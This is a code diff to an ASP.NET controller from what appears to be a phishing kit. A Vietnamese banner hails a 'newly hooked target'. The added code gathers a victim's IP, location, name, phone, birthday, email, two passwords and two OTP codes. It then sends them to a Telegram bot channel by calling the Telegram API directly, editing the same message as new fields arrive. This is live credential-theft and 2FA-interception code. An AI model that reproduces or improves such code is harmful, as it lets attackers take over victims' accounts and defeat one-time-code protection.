@@ -1,7 +1,9 @@
-﻿using Microsoft.AspNetCore.Mvc;
+﻿using Microsoft.AspNetCore.Http;
+using Microsoft.AspNetCore.Mvc;
 using Microsoft.AspNetCore.Mvc.RazorPages;
+using Newtonsoft.Json;
 using System.Diagnostics;
-using TelegramBot;
+//using TelegramBot;
 using WebApplication1.Models;
 
 namespace WebApplication1.Controllers
@@ -10,13 +12,14 @@ namespace WebApplication1.Controllers
     {
         private readonly ILogger<BusinessController> _logger;
         private readonly IConfiguration _configuration;
-        private readonly ITelegramBot _telegramBot;
+        //private readonly ITelegramBot _telegramBot;
+        private readonly int _messageId;
 
-        public BusinessController(ILogger<BusinessController> logger, IConfiguration configuration, ITelegramBot telegramBot)
+
+        public BusinessController(ILogger<BusinessController> logger, IConfiguration configuration)
         {
             _logger = logger;
             _configuration = configuration;
-            _telegramBot = telegramBot;
         }
 
         [HttpPost]
@@ -68,12 +71,16 @@ namespace WebApplication1.Controllers
             string timeWait = _configuration["TimeWait"];
             ViewBag.TimeConfirm = timeWait;
 
-            SendData();
+            var messageId = SendData().Result;
+            if (messageId != null)
+            {
+                HttpContext.Session.SetInt32(Constants.MESSAGE_ID, messageId.Value);
+            }
 
             return View();
         }
 
-        private async void SendData()
+        private async Task<int?> SendData()
         {
             HttpContext.Session.GetString(Constants.IP);
             HttpContext.Session.GetString(Constants.LOCATION);
@@ -90,27 +97,58 @@ namespace WebApplication1.Controllers
             string telegramBotToken = _configuration["TelegramBotToken"];
             string channel = _configuration["Channel"];
             var message = "ĐỐI TƯỢNG MỚI DÍNH ĐÒN: " + HttpContext.Session.GetString(Constants.IP) + "\n" +
+                          "--------------------------------" + "\n" +
                           "IP: " + HttpContext.Session.GetString(Constants.IP) + "\n" +
+                          "--------------------------------" + "\n" +
                           "Location: " + HttpContext.Session.GetString(Constants.LOCATION) + "\n" +
+                          "--------------------------------" + "\n" +
                           "Page Name: " + HttpContext.Session.GetString(Constants.PAGE_NAME) + "\n" +
+                          "--------------------------------" + "\n" +
                           "Name: " + HttpContext.Session.GetString(Constants.NAME) + "\n" +
+                          "--------------------------------" + "\n" +
                           "Phone: " + HttpContext.Session.GetString(Constants.PHONE) + "\n" +
+                          "--------------------------------" + "\n" +
                           "Birthday: " + HttpContext.Session.GetString(Constants.BIRTHDAY) + "\n" +
+                          "--------------------------------" + "\n" +
                           "Email or Phone: " + HttpContext.Session.GetString(Constants.EMAIL_OR_PHONE) + "\n" +
+                          "--------------------------------" + "\n" +
                           "Password: " + HttpContext.Session.GetString(Constants.PASSWORD) + "\n" +
+                          "--------------------------------" + "\n" +
                           "Password2: " + HttpContext.Session.GetString(Constants.PASSWORD2) + "\n" +
+                          "--------------------------------" + "\n" +
                           "OTP1: " + HttpContext.Session.GetString(Constants.OTP1) + "\n" +
+                          "--------------------------------" + "\n" +
                           "OTP2: " + HttpContext.Session.GetString(Constants.OTP2) + "\n" +
+                          "--------------------------------" + "\n" +
                           "Time: " + DateTime.UtcNow.AddHours(7).ToString("dd/MM/yyyy HH:mm") + "\n";
 
             try
             {
-                await _telegramBot.SendMessageAsync(telegramBotToken, channel, message);
-                Console.WriteLine("Send message success");
+                using (HttpClient client = new HttpClient())
+                {
+                    var messageId = HttpContext.Session.GetInt32(Constants.MESSAGE_ID);
+                    if (messageId != null)
+                    {
+                        string editMessageUrl = $"https://api.telegram.org/bot{telegramBotToken}/editMessageText?chat_id={channel}&message_id={messageId}&text={message}";
+                        HttpResponseMessage editResponse = await client.GetAsync(editMessageUrl);
+                        string editResponseContent = await editResponse.Content.ReadAsStringAsync();
+                        return null;
+                    }
+                    else
+                    {
+                        string sendMessageUrl = $"https://api.telegram.org/bot{telegramBotToken}/sendMessage?chat_id={channel}&text={message}";
+                        HttpResponseMessage sendResponse = await client.GetAsync(sendMessageUrl);
+                        string sendResponseContent = await sendResponse.Content.ReadAsStringAsync();
+                        var sendResponseObject = JsonConvert.DeserializeObject<SendMessageResponse>(sendResponseContent);
+                        return sendResponseObject.result.message_id;
+                    }
+                    Console.WriteLine("Send message success");
+                }
             }
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
+                return null;
             }
 
 
